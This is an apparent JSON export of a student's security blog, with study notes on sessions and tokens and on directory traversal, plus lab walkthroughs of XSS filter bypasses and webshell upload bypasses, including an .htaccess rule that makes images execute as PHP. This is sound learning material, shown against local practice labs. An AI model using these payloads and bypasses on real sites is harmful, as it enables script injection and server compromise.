{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"Smtsec","url":"https://singlemindedt.github.io","root":"/"},"pages":[{"title":"迷路了404","date":"2019-08-31T01:24:31.422Z","updated":"2019-08-31T01:24:18.825Z","comments":true,"path":"404.html","permalink":"https://singlemindedt.github.io/404.html","excerpt":"","text":""},{"title":"about me","date":"2019-08-31T01:12:58.000Z","updated":"2019-12-17T13:57:59.289Z","comments":true,"path":"about/index.html","permalink":"https://singlemindedt.github.io/about/index.html","excerpt":"","text":"就读于CUMT，目前是大三，随便瞎写写，写的不好，还望各位轻点吐槽😅有事可以联系我联系方式：扣扣MTcyNzMzMDAxOA==（😁注明来意哦~）"}],"posts":[{"title":"cookie、session、token","slug":"cookie","date":"2020-09-11T08:59:48.000Z","updated":"2020-09-14T06:45:48.381Z","comments":true,"path":"2020/09/11/cookie/","link":"","permalink":"https://singlemindedt.github.io/2020/09/11/cookie/","excerpt":"","text":"🐖： HTTP为无状态协议,即本次请求和上一次的请求不存在关联性； 比如：我在www.a.com/login.php里面登陆了，我在www.a.com/index.php 也希望是登陆状态，但是，这是2个不同的页面，也就是2个不同的HTTP请求，这2个HTTP请求是无状态的，也就是无关联的，所以无法单纯的在index.php中读取到它在login.php中已经登陆了！—3 1.session理解：存储会话控制机制,连接标志； 类似于一个状态列表，存储于服务器中； 目的：为无状态的HTTP提供的持久机制； 服务器一般使用cookie来实现session，cookie包含session的标识符； 过程： 客户端发送请求 服务器检测是否有session（没有则创建一个session，有则利用该session），服务器临时保存session，用户离开网站后销毁 +++ 关键区别 Cookies是包含用户信息的客户端文件，而Sessions是包含用户信息的服务器端文件。 Cookie不依赖于Session，但是Session依赖于Cookie。 Cookie的过期时间取决于您为其设置的生存时间，而Session在用户关闭其浏览器时结束。 Cookie的最大大小为4KB，而在Session中，您可以存储任意数量的数据。可以达到的唯一限制是脚本一次可以消耗的最大内存，默认情况下为128MB Cookie没有名为unsetcookie（）的函数，而在Session中您可以使用Session_destroy（）; 用于销毁所有注册数据或取消设置某些数据 无需启动cookie，因为它存储在本地计算机中，而在session中， 在PHP中使用$ _SESSION之前，必须编写session_start（）;。其他语言也一样 +++ 2. cookie基于会话的身份验证 理解： 目的：同服务器保持活动状态 形式：以文本文件形式储存在浏览器目录中 cookie具有时效性 cookie管理—- 持久化(存储在本地磁盘) 非持久化（存储在内存） 会话存储在服务器内存中，当大量用户同时使用时，会给服务器造成一定压力； Cookie的身份验证是有状态的—&gt;服务器和客户端同时保留身份验证记录或会话； 过程： 客户端发送请求 用户登录username/password 服务端接收请求，返回含Set-cookie头部的响应包 服务器验证凭据正确无误，为该用户创建会话，将其存储在数据库中 将会话ID存储在用户浏览器的cookie中(数据大小受浏览器限制通常&lt;4KB) 客户端再次发送请求(包含cookie，以便服务器用来唯一标识客户端身份信息)，服务端接收并验证用户身份 用户保持登录状态时，cookie将与后续每个请求一起发送 服务器将cookie上存储的会话ID与内存（数据库）中存储的会话信息进行比较，以验证用户的身份并发送响应状态的响应 客户端注销登录状态，该会话将从客户端和服务器数据库中删除； +++ 3. tokenJWT（JSON Web Token）基于令牌的身份验证 理解：基于token的身份验证是无状态的–&gt;服务器不保留会话信息； 访问令牌 构成：uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign(签名，由token的前几位+盐以哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接token请求服务器)。 过程： 用户发送请求 用户登录username/password 服务器接收请求，验证凭据正确无误，并创建一个已签名的token，携带该token信息响应客户端 客户端收到响应，将token本地存储或存储于会话存储或cookie中，并在后续的每个请求中携带该token 服务器接收请求，检测并解码token签名，从token中获取用户信息，最后响应客户端（将此token作为附加的Authorization标头或通过上述其他方法之一包含在内） 服务器解码token token有效：处理请求并发送响应 用户注销：客户端销毁token（无需与服务器进行交互） 优点：使用token验证是无状态的，后端无需保存token记录； 每个token都是独立的，包含有效性和用户信息的所有数据； 服务器只需在成功的登录请求上对token进行签名，并验证token的有效性； 参考： 彻底理解cookie、session、token 彻底弄懂session，cookie，token Cookie、Session、Token那点事儿（原创） Session vs Token Based Authentication JSON Web Tokens vs. Session Cookies for Authentication Cookies vs. Tokens: The Definitive Guide Difference between Cookie and Session","categories":[],"tags":[{"name":"note","slug":"note","permalink":"https://singlemindedt.github.io/tags/note/"}]},{"title":"命令行下常用文件操作命令","slug":"CD","date":"2020-09-10T05:27:08.000Z","updated":"2020-09-10T13:54:53.323Z","comments":true,"path":"2020/09/10/CD/","link":"","permalink":"https://singlemindedt.github.io/2020/09/10/CD/","excerpt":"","text":"[TOC] 1、进入盘符1234直接输入对应目标盘字母加：eg:进入F盘f:F: 2、进入指定目录12345cd 目录名（一级目录）cd 目录路径如打开某一级目录文件则无需cd,eg:XXX.txt +++ 3、利用/d参数直接进入某盘下某目录12eg:进入F盘下tools目录cd /d f:\\tools +++ 4、返回上级目录1cd .. 5、返回当前盘根目录12cd /cd \\ 6、dir命令查看该目录下文件及子目录列表详细信息12dirdir /a * 7、ls列出当前目录下所有一级目录1ls 8、通过在命令后加/?查看命令用法1dir/?","categories":[],"tags":[{"name":"命令","slug":"命令","permalink":"https://singlemindedt.github.io/tags/命令/"},{"name":"note","slug":"note","permalink":"https://singlemindedt.github.io/tags/note/"}]},{"title":"目录穿越漏洞","slug":"目录穿越漏洞","date":"2020-08-24T01:42:05.000Z","updated":"2020-08-24T04:53:15.868Z","comments":true,"path":"2020/08/24/目录穿越漏洞/","link":"","permalink":"https://singlemindedt.github.io/2020/08/24/目录穿越漏洞/","excerpt":"","text":"1. 目录穿越目录穿越的目的旨在访问存在于网站根目录外面的文件或目录。通过浏览应用，攻击者可以寻找存储在Web服务器上的其他文件的相对路径。攻击者若可访问位于应用服务器或其他后端文件系统的文件或目录，就可能出现路径穿越漏洞，攻击者通过..\\向上回溯，从而访问服务器上任意文件。 123Unix操作系统上，../ 是一个标准的返回上一级路径的语法；Windows操作系统上， ../ 和 ..\\ 都是返回上一级的语句。 2. 一般形式：12http://***/go.action?file=..\\..\\etc\\passwdhttps://www.*****.com/loadImage?filename=../../../etc/passwd 3. 绕过方法： 绝对路径 双写../绕过 URL编码绕过 绝对路径+../ %00截断文件后缀 Unicode编码绕过 4. 防御： 输入添加白名单 php.ini配置open_basedir 过滤关键字符../ 5. 参考： 目录穿越/遍历漏洞 网站安全(13) ——目录穿越漏洞(Directory Traversal) 任意文件读取漏洞 任意文件读取的深度利用 漏洞手记-任意文件读取 目录遍历，文件包含和Proc文件系统 一个任意文件读取漏洞记录","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"},{"name":"security","slug":"security","permalink":"https://singlemindedt.github.io/tags/security/"}]},{"title":"CTFHub-wp","slug":"CTFHub-wp","date":"2020-08-12T05:42:00.000Z","updated":"2020-08-24T04:25:09.339Z","comments":true,"path":"2020/08/12/CTFHub-wp/","link":"","permalink":"https://singlemindedt.github.io/2020/08/12/CTFHub-wp/","excerpt":"","text":"目录遍历 点击点击开始寻找flag,直接给出了目录，在flag_in_here/4/2下找到flag； 该题目直接给了攻击者目录的访问权限，直接遍历查找即可；","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://singlemindedt.github.io/tags/wp/"}]},{"title":"XSS小游戏","slug":"XSS小游戏","date":"2020-08-04T04:35:43.000Z","updated":"2020-08-28T11:07:48.940Z","comments":true,"path":"2020/08/04/XSS小游戏/","link":"","permalink":"https://singlemindedt.github.io/2020/08/04/XSS小游戏/","excerpt":"","text":"第1关输入变量被直接输出； 尝试： 1127.0.0.1/xssgame-master/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt; 成功； 查看源码： 1GET方式将name的值传给`$str`变量，且未作任何过滤限制； 第2关keyword变量通过GET方式传入，赋值给$str变量，然后带入到&lt;h2&gt;标签中和&lt;input&gt;标签；&lt;h2&gt;标签经过了htmlspecialchars($str)编码，&lt;input&gt;标签没有任何过滤，所以尝试对&lt;input&gt;标签进行闭合，来触发事件，使用&quot;&gt;完成闭合。 1http://127.0.0.1/xssgame-master/level2.php?keyword=xss\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&amp;submit=%E6%90%9C%E7%B4%A2 查看源码： 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str.&apos;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 🐖：htmlspecialchars() 定义和用法htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 预定义的字符是： &amp; （和号）成为 &amp;amp; “ （双引号）成为 &amp;quot ‘ （单引号）成为&amp;#039 &lt; （小于）成为 &amp;lt &gt; （大于）成为 &amp;gt +++ 经htmlspecialchars（）处理的代码： 123456789&lt;title&gt;第2关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第2关 窒息的操作&lt;/h1&gt;&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt; +++ 第3关输入的变量被htmlspecialchars函数处理了，该函数默认的配置不过滤单引号，只有设置了:quotestyle选项为ENT_QUOTES才会过滤掉单引号。在这里这个函数处理的字符有&lt; &gt; &quot; ，没有处理单引号，因此利用单引号和不含&lt;&gt;的函数构造payload，先通过单引号闭合value; 12345http://127.0.0.1/xssgame-master/level3.php?keyword=' onclick=alert(1) //http://127.0.0.1/xssgame-master/level3.php?keyword=' onclick='alert(1)'//onclick 事件会在对象被点击时发生。http://127.0.0.1/xssgame-master/level3.php?keyword=' onmouseover=alert(1) x='//onmouseover 事件会在鼠标指针移动到指定的元素上时发生。 🐖：onmouseover 事件 htmlspecialchars函数处理情况： +++ +++ 第4关过滤了尖括号，构造不包含这两个符号的payload，value的值与第三关有所差异，这里需要使用双引号用于闭合value标签； 1http://127.0.0.1/xssgame-master/level3.php?keyword=\" onclick=alert(1) // 再点击一下输入框即可； 第5关&lt;script\\on被替换为&lt;scr_ipt\\o_n;使用其他的函数构造payload； 🐖：JavaScript 事件参考手册 由于JavaScript事件都含有on，所以这里暂时无法使用JavaScript事件来弹窗； 这里利用&lt;a&gt; 标签的 href 属性： 🐖： 标签的 href 属性 标签的 href 属性用于指定超链接目标的 URL。 href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。如果用户选择了 标签中的内容，那么浏览器会尝试检索并显示 href 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表。 1\"&gt;&lt;a href=\"javascript:alert(1)\"&gt;xss&lt;/a&gt; 查看源码： 123456789101112&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=\"'.$str3.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; 🐖： strtolower() 函数把字符串转换为小写； 相关： 函数 作用 lcfirst() 把字符串中的首字符转换为小写 strtoupper() 把字符串转换为大写 ucfirst() 把字符串中的首字符转换为大写 ucwords() 把字符串中每个单词的首字符转换为大写 第6关源码： 123456789101112131415&lt;?phpini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=\"'.$str6.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; 将”&lt;script”、”on”、”src”、”data”、”href”都进行了替换，但未对大小写进行统一判定处理，可利用大小写绕过； 1\"&gt;&lt;Script&gt;alert(1)&lt;/Script&gt; 第7关源码： 123456789101112131415&lt;?php ini_set(\"display_errors\", 0);$str =strtolower( $_GET[\"keyword\"]);$str2=str_replace(\"script\",\"\",$str);$str3=str_replace(\"on\",\"\",$str2);$str4=str_replace(\"src\",\"\",$str3);$str5=str_replace(\"data\",\"\",$str4);$str6=str_replace(\"href\",\"\",$str5);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=\"'.$str6.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; 进行了小写转换，同时将敏感字符替换为空; 可以使用双写绕过； 1\"&gt;&lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt; 第8关源码： 1234567891011121314151617181920&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; &lt;?php echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';?&gt; 小写转换，敏感字符加_替换，同时对&quot;进行实体化替换； 通过href属性将处理的值输出； 可使用编码绕过，利用Javascript伪协议后+其他编码 如果用户选择了 标签中的内容，那么浏览器会尝试检索并显示 href 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表。 将敏感字符中的部分字母ASCII转URL编码： 12javascri&amp;#x70;t:alert() #HTML实体编码（HEX） javascri&amp;#112;t:alert() #HTML实体编码（DEC） 🐖： HTML Entity 字符实体(字符转义) HTML URL 编码 第9关源码： 1234567891011121314151617181920212223242526&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);$str7=str_replace('\"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=\"'.htmlspecialchars($str).'\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;?phpif(false===strpos($str7,'http://'))&#123; echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"您的链接不合法？有没有！\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'; &#125;else&#123; echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;';&#125;?&gt; 字符转为小写，敏感字符替换； strpos() 函数查找字符串在另一字符串中第一次出现的位置。 注释：strpos() 函数对大小写敏感。 返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。 注释：字符串位置从 0 开始，不是从 1 开始。 通过href属性将处理的值输出； 需要使strpos()函数的返回结果不为false，即在keyword中需要包含http://； 可采用以下两种思路： 123注释：javascri&amp;#x70;t:alert()//http://javascri&amp;#x70;t:alert()/*http://*/ 12位置放在弹窗提示里javascri&amp;#x70;t:alert('http://') 第10关源码： 1234567891011121314&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str11 = $_GET[\"t_sort\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; 通过GET传值的有两个参数keyword和t_sort，t_sort字符中的&lt;&gt;被替换为空； 存在三个隐藏的input输入框 可构造如下payload： 1?t_sort=\"type=\"text\" onclick = \"alert(1) 第11关12345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_SERVER['HTTP_REFERER'];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_ref\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; 关键： 1234$str11=$_SERVER['HTTP_REFERER'];//获取HTTP中referer信息$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);&lt;input name=\"t_ref\" value=\"'.$str33.'\" type=\"hidden\"&gt; 可对referer注入； 抓包，Referer处添加如下代码： 1Referer: \"onclick=alert(1) type=\"text\" 第12关源码： 12345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_SERVER['HTTP_USER_AGENT'];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_ua\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; 与11关类似，在user_agent处添加如下代码： 1\" onmouseover=alert(1) type=\"text\" 第13关源码： 1234567891011121314151617&lt;?php setcookie(\"user\", \"call me maybe?\", time()+3600);ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str00 = $_GET[\"t_sort\"];$str11=$_COOKIE[\"user\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"'.'\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;&lt;input name=\"t_cook\" value=\"'.$str33.'\" type=\"hidden\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; 🐖：setcookie() 函数 setcookie() 函数向客户端发送一个 HTTP cookie。 关键： 12345setcookie(\"user\", \"call me maybe?\", time()+3600);$str11=$_COOKIE[\"user\"];$str22=str_replace(\"&gt;\",\"\",$str11);$str33=str_replace(\"&lt;\",\"\",$str22);&lt;input name=\"t_cook\" value=\"'.$str33.'\" type=\"hidden\"&gt; 所以直接抓包修改cookie中的user值即可: 1user=\" onclick=alert(1) type=\"text\" 第14关源码： 12345&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"src\"];echo '&lt;body&gt;&lt;span class=\"ng-include:'.htmlspecialchars($str).'\"&gt;&lt;/span&gt;&lt;/body&gt;';?&gt; 🐖： ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。 ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。 利用文件包含，可构造如下payload： 1src=level1.php?name=1'window.alert() 第15关123456789&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"&amp;nbsp;\",$str);$str3=str_replace(\" \",\"&amp;nbsp;\",$str2);$str4=str_replace(\"/\",\"&amp;nbsp;\",$str3);$str5=str_replace(\" \",\"&amp;nbsp;\",$str4);echo \"&lt;center&gt;\".$str5.\"&lt;/center&gt;\";?&gt; 考虑使用编码绕过： 1keyword=&lt;img%0dsrc=1%0donerror=alert()&gt; 结束！ 12345678 ,ad8888ba, 88 88 88 88 d8\"' `\"8b 88 88 88 88 d8' 88 88 88 88 88 ,adPPYba, ,adPPYba, ,adPPYb,88 88 ,adPPYba, 88,dPPYba, 88 88 88888 a8\" \"8a a8\" \"8a a8\" `Y88 88 a8\" \"8a 88P' \"8a 88 Y8, 88 8b d8 8b d8 8b 88 88 8b d8 88 d8 \"\" Y8a. .a88 \"8a, ,a8\" \"8a, ,a8\" \"8a, ,d88 88, ,d88 \"8a, ,a8\" 88b, ,a8\" aa `\"Y88888P\" `\"YbbdP\"' `\"YbbdP\"' `\"8bbdP\"Y8 \"Y8888P\" `\"YbbdP\"' 8Y\"Ybbd8\"' 88","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://singlemindedt.github.io/tags/XSS/"}]},{"title":"文件包含漏洞","slug":"文件包含漏洞-1","date":"2020-08-04T01:27:35.000Z","updated":"2020-08-04T01:29:57.191Z","comments":true,"path":"2020/08/04/文件包含漏洞-1/","link":"","permalink":"https://singlemindedt.github.io/2020/08/04/文件包含漏洞-1/","excerpt":"","text":"文件包含漏洞学习总结","categories":[],"tags":[]},{"title":"Upload-labs记录","slug":"Upload-labs记录","date":"2020-08-03T03:42:09.000Z","updated":"2020-08-03T12:48:09.328Z","comments":true,"path":"2020/08/03/Upload-labs记录/","link":"","permalink":"https://singlemindedt.github.io/2020/08/03/Upload-labs记录/","excerpt":"","text":"+++ Pass-01 如图，要求我们上传一个webshell到服务器，并要求我们上传图片； 首先，我们上传任意文件试试： 提示我们，只能上传.jpg|.png|.gif类型的文件； 查看提示，“本pass在客户端使用js对不合法图片进行检查！”； 提示已经很明确了，该题目在客户端使用js过滤不合法后缀，我们只需要在上传时将文件改为合法后缀格式，然后抓包，再改包； 看看源码： 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 拦截方式：客户端js白名单检查;根据上传文件的后缀是否为.jpg|.png|.gif格式来判断文件能否上传； 绕过方式：将木马伪装成.jpg|.png|.gif文件，上传后burp拦截数据包，更改文件后缀为.php，再forward. 改包： 其他方法: 修改js脚本 浏览器禁止使用js脚本（火狐下🦊) 在Firefox地址栏里输入“about:config”。在搜索栏输入“javascript.enabled”查找到首选项。点击鼠标右键选择“切换”，把“javascript.enabled”键值改为“false” +++ Pass-02首先，尝试上传php文件，提示信息为：文件类型不正确，请重新上传！这次给的不是白名单或者黑名单，而是告诉我们文件类型不正确，应该为MIME的检查。 查看提示： 提示：本pass在服务端对数据包的MIME进行检查！ 补充：MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 12345678910111213141516171819常见的MIME类型(通用型)：超文本标记语言文本 .html text/htmlxml文档 .xml text/xmlXHTML文档 .xhtml application/xhtml+xml普通文本 .txt text/plainRTF文本 .rtf application/rtfPDF文档 .pdf application/pdfMicrosoft Word文件 .word application/mswordPNG图像 .png image/pngGIF图形 .gif image/gifJPEG图形 .jpeg,.jpg image/jpegau声音文件 .au audio/basicMIDI音乐文件 mid,.midi audio/midi,audio/x-midiRealAudio音乐文件 .ra, .ram audio/x-pn-realaudioMPEG文件 .mpg,.mpeg video/mpegAVI文件 .avi video/x-msvideoGZIP文件 .gz application/x-gzipTAR文件 .tar application/x-tar任意的二进制数据 application/octet-stream +++ 源码： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 拦截方式：服务端白名单;对文件的MIME(Multipurpose Internet Mail Extensions)进行了验证，只允许图片类文件上传通过 绕过方式： 直接上传含木马的图片文件，burp截包，修改后缀为php文件 直接上传木马文件，burp抓包，修改Content-Type为image/png等允许类型 +++ 此处我们利用2修改Content-Type为image/png：抓包：[4]:() 改包：[5]:() 发包：文件上传成功，直接将文件拖出来即可得访问； +++ Psaa-03首先，尝试上传php文件，提示信息为：提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！ 查看提示： 本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！ 源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; +++ 拦截方式：服务端黑名单验证;(禁止上传.asp|.aspx|.php|.jsp后缀文件) 绕过方式：(1)可上传.php3.phtml .phps .php5 .pht…等这样可以被服务器解析的后缀名(2)重写文件解析规则绕过，先上传一个.htaccess文件，再上传一个hack.png文件(含木马)通过.htaccess文件调用php解析器去解析一个文件名中只要包含”hack.png”这个字符串的任意文件，无论扩展名是什么(没有也行)，都以php的方式来解析.htaccess文件内容： 123&lt;FilesMatch \"hack.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; application/x-httpd-php称MIME类型 此处修改文件后缀为.php3; 上传成功！+++ Pass-04首先，尝试上传php文件，提示信息为：提示：此文件不允许上传! 查看提示： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ 源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 